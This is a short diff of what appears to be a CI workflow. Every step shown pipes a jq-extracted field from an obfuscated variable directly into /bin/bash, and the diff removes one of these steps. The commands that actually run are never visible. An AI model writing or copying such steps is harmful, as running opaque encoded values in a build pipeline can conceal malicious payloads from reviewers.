@@ -21,7 +21,6 @@ jobs:
           echo $cf97930 | jq -r .ndo39 | /bin/bash
           echo $c07185 | jq -r .qt39271 | /bin/bash
           printf '%s' "$x974" | jq -r .x78279 | /bin/bash
-          printf '%s' "$pqav160" | jq -r .lbnb83 | /bin/bash
           echo $w002 | jq -r .odtmj46 | /bin/bash
           echo $jz91111 | jq -r .bbmw970 | /bin/bash
           printf '%s' "$mgemh1" | jq -r .dvcku2 | /bin/bash
